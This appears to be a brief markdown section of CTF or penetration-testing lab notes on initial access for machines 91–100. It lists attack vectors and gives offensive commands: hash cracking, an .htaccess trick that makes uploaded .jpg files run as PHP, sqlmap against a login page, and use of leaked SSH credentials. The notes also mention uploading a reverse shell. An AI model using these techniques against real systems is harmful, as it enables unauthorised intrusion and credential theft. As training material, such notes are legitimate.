## 🔓 Initial Access (Machines 91–100)

### Common Vectors

- Web application exploits
- File upload vulnerabilities
- Default credentials
- SQL Injection / RCE
- Exploitable CMS plugins or themes

### Techniques

```bash
# Exposed Config File
curl http://<IP>/config.php

# Hash Cracking
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt

# File Upload Bypass
mv shell.php shell.jpg; echo "AddType application/x-httpd-php .jpg" > .htaccess

# Auth Bypass / Admin Panel Access
sqlmap -u "http://<IP>/login.php" --batch --dbs

# SSH with Leaked Credentials
ssh user@<IP>
```

### Notes

- Leveraged default admin creds to access CMS dashboard and upload reverse shell.
- Exploited outdated CMS plugins for RCE.
- Reused leaked SSH credentials across multiple services.
